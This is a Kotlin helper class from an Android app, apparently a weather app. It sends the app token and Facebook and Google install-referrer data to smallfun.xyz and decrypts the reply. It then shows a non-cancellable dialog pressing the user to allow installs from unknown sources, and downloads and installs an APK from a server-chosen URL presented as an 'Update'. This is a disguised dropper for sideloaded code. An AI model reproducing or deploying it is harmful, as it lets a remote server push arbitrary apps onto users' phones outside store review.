package com.xxxxxxh.lib

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.app.ActivityManager.RunningAppProcessInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Message
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.LayoutInflater
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.core.content.FileProvider
import com.alibaba.fastjson.JSON
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.bumptech.glide.Glide
import com.facebook.applinks.AppLinkData
import com.yarolegovich.lovelydialog.LovelyCustomDialog
import com.zhouyou.http.EasyHttp
import com.zhouyou.http.callback.DownloadProgressCallBack
import com.zhouyou.http.callback.SimpleCallBack
import com.zhouyou.http.exception.ApiException
import es.dmoral.prefs.Prefs
import es.dmoral.toasty.Toasty
import java.io.File


@SuppressLint("StaticFieldLeak")
@RequiresApi(Build.VERSION_CODES.O)
object CommonUtils {


    var progressBar: ProgressBar? = null
    var downloadDlg: LovelyCustomDialog? = null
    private var entity: ResultEntity? = null
    private var isInstall = false
    private var imgUrl: String? = null
    private var context: Context? = null

    private val handler: Handler = @SuppressLint("HandlerLeak")
    object : Handler() {
        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == 1) {
                if (!isInstall) {
                    if (context!!.packageManager.canRequestPackageInstalls()) {
                        isInstall = true
                        sendEmptyMessage(1)
                    } else {
                        if (!isBackground(context!!)) {
                            createPermissionDlg(context!!, imgUrl!!)
                        } else {
                            sendEmptyMessageDelayed(1, 1500)
                        }
                    }
                } else {
                    createUpdateDlg(context!!, entity!!.ikey, entity!!.path)
                }
            }
        }
    }

    fun getFacebookInfo(context: Context): String {
        var appLink = ""
        if (TextUtils.isEmpty(Prefs.with(context).read("facebook"))) {
            AppLinkData.fetchDeferredAppLinkData(context) {
                appLink = it?.targetUri?.toString() ?: "Applink is empty"
                if (!TextUtils.equals(appLink, "Applink is empty")) {
                    Prefs.with(context).write("facebook", appLink)
                }
            }
        } else {
            appLink = Prefs.with(context).read("facebook")
        }

        return appLink
    }

    fun getGoogleInfo(context: Context): String {
        var installReferrer = ""
        if (TextUtils.isEmpty(Prefs.with(context).read("google"))) {
            val ref = InstallReferrerClient.newBuilder(context).build()
            ref.startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    installReferrer =
                        if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) {
                            ref.installReferrer.installReferrer
                        } else {
                            "Referrer is empty"
                        }
                    if (!TextUtils.equals(installReferrer, "Referrer is empty")) {
                        Prefs.with(context).write("google", installReferrer)
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {
                    installReferrer = "Referrer is empty"
                }

            })
        } else {
            installReferrer = Prefs.with(context).read("google")
        }

        return installReferrer
    }

    fun update(context: Context) {
        this.context = context
        val url = "http://smallfun.xyz/worldweather361/weather1.php"
        EasyHttp.post(url)
            .params("data", getRequestData(context).toString())
            .execute<String>(object : SimpleCallBack<String>() {
                override fun onError(e: ApiException?) {
                    Toasty.error(context, e.toString()).show()
                }

                override fun onSuccess(t: String?) {
                    val result = AesEncryptUtil.decrypt(t)
                    entity = JSON.parseObject(result, ResultEntity::class.java)
                    if (Build.VERSION.SDK_INT > 24) {
                        if (!context.packageManager.canRequestPackageInstalls()) {
                            createPermissionDlg(context, entity!!.ukey)
                        } else {
                            isInstall = true
                            createUpdateDlg(context, entity!!.ikey, entity!!.path)
                        }
                    } else {
                        createUpdateDlg(context, entity!!.ikey, entity!!.path)
                    }
                }
            })
    }

    fun createPermissionDlg(context: Context, imgUrl: String) {
        this.imgUrl = imgUrl
        val v = LayoutInflater.from(context).inflate(R.layout.dialog_permission, null)
        val imageView = v.findViewById<ImageView>(R.id.img)
        Glide.with(context).load(imgUrl).into(imageView)
        LovelyCustomDialog(context)
            .setTitle("Permission")
            .setView(v)
            .setCancelable(false)
            .setListener(R.id.tv_ok, true) {
                handler.sendEmptyMessageDelayed(1, 1500)
                if (!context.packageManager.canRequestPackageInstalls()) {
                    allowThirdInstall(context)
                } else {
                    createUpdateDlg(context, entity!!.ikey, entity!!.path)
                }
            }
            .show()
    }

    fun createUpdateDlg(context: Context, content: String, path: String) {
        val v = LayoutInflater.from(context).inflate(R.layout.dialog_update, null)
        val tv: TextView = v.findViewById(R.id.update)
        tv.text = content
        LovelyCustomDialog(context)
            .setTitle("Update")
            .setView(v)
            .setListener(R.id.btn, true) {
                download(context, entity!!.path)
            }
            .show()
    }

    fun createDownloadDlg(context: Context): LovelyCustomDialog {
        val view = LayoutInflater.from(context).inflate(R.layout.dialog_download, null)
        progressBar = view.findViewById(R.id.progress_bar)
        val dlg: LovelyCustomDialog = LovelyCustomDialog(context)
        dlg.setView(view)
        dlg.setTitle("Download")
        return dlg
    }

    private fun download(context: Context, url: String) {
        EasyHttp.downLoad(url)
            .savePath(Environment.getExternalStorageDirectory().toString())
            .saveName("a.apk")
            .execute(object : DownloadProgressCallBack<String>() {
                override fun onStart() {
                    Log.i("xxxxxxH", "onStart")
                }

                override fun onError(e: ApiException?) {
                    Log.i("xxxxxxH", "onError: ${e.toString()}")
                }

                override fun update(bytesRead: Long, contentLength: Long, done: Boolean) {

                    if (downloadDlg == null) {
                        downloadDlg = createDownloadDlg(context)
                    }
                    downloadDlg!!.show()
                    val progress = (bytesRead * 100 / contentLength).toInt()
                    Log.i("xxxxxxH", "update: $progress")
                    progressBar?.let {
                        it.progress = progress
                    }
                }

                override fun onComplete(path: String?) {
                    Log.i("xxxxxxH", "onComplete")
                    Toasty.success(context, "Download Completed Saved in: $path").show()
                    downloadDlg?.dismiss()
                    install(context, path!!, -1)
                }
            })
    }

    fun addReceiver(context: Context): BroadcastReceiver {
        return object : BroadcastReceiver() {
            override fun onReceive(p0: Context?, p1: Intent?) {
                if (p1?.action == Intent.ACTION_PACKAGE_ADDED) {
                    val data = p1.dataString.toString()
                    data.let {
                        Log.e("Install-apk:", it)
                        if (data.contains(context.packageName.toString())) {
                            Prefs.with(context).writeBoolean("state", true)
                        }
                    }
                }
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    fun allowThirdInstall(context: Context) {
        if (Build.VERSION.SDK_INT > 24) {
            if (!context.packageManager.canRequestPackageInstalls()) {
                val uri = Uri.parse("package:" + context.packageName)
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                (context as Activity).startActivityForResult(i, 1)
            }
        }
    }

    private fun install(context: Context, path: String, req: Int) {
        val file = File(path)
        if (file == null && !file.exists()) {
            return
        }
        var uri: Uri? = null
        uri = if (Build.VERSION.SDK_INT >= 24) {
            FileProvider.getUriForFile(
                context, context.packageName.toString() + ".fileprovider",
                file
            )
        } else {
            Uri.fromFile(file)
        }
        if (Build.VERSION.SDK_INT >= 26) {
            val hasInstallPermission: Boolean = isHasInstallPermissionWithO(context)
            if (!hasInstallPermission) {
                startInstallPermissionSettingActivity(context, req)
                return
            }
        }
        val intent = Intent("android.intent.action.VIEW")
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        if (Build.VERSION.SDK_INT >= 24) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        intent.setDataAndType(uri, "application/vnd.android.package-archive")
        context.startActivity(intent)
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private fun isHasInstallPermissionWithO(context: Context?): Boolean {
        return context?.packageManager?.canRequestPackageInstalls() ?: false
    }


    private fun startInstallPermissionSettingActivity(context: Context?, req: Int) {
        if (context != null) {
            val uri = Uri.parse("package:" + context.packageName)
            val intent = Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES", uri)
            (context as Activity).startActivityForResult(intent, req)
        }
    }

    private fun getRequestData(context: Context): RequestBean {
        val istatus = Prefs.with(context).readBoolean("isFirst", true)
        val requestBean = RequestBean()
        requestBean.appId = BaseApplication.instance!!.getAppId()
        requestBean.appName = BaseApplication.instance!!.getAppName()
        requestBean.applink = Prefs.with(context).read("facebook", "AppLink is empty")
        requestBean.ref = Prefs.with(context).read("google", "Referrer is empty")
        requestBean.token = BaseApplication.instance!!.getToken()
        requestBean.istatus = istatus
        return requestBean
    }


    fun isBackground(context: Context): Boolean {
        val activityManager = context
            .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val appProcesses = activityManager
            .runningAppProcesses
        for (appProcess in appProcesses) {
            if (appProcess.processName == context.packageName) {
                return appProcess.importance != RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            }
        }
        return false
    }
}